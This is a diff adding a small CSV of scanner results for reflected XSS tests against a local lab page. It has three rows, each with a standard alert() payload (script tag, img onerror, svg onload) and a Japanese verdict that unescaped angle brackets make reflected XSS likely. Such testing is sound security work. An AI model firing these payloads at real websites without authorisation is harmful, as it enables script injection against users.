@@ -1,0 +1,4 @@
+﻿url,param,method,context,payload,unescaped_chars,verdict,reason
+http://localhost/xss-lab/tag_vuln.php,keyword,GET,tag_between,<script>alert('xssu7jksvrj')</script>,"<,>",反射型XSSの疑いあり,"<,> が未変換で、tag_between コンテキストで実行されうる構造（属性/要素）が成立しています。"
+http://localhost/xss-lab/tag_vuln.php,keyword,GET,tag_between,<img src=x onerror=alert('xssknfzkl2j')>,"<,>",反射型XSSの疑いあり,"<,> が未変換で、tag_between コンテキストで実行されうる構造（属性/要素）が成立しています。"
+http://localhost/xss-lab/tag_vuln.php,keyword,GET,tag_between,<svg onload=alert('xssn28vcyz2')>,"<,>",反射型XSSの疑いあり,"<,> が未変換で、tag_between コンテキストで実行されうる構造（属性/要素）が成立しています。"
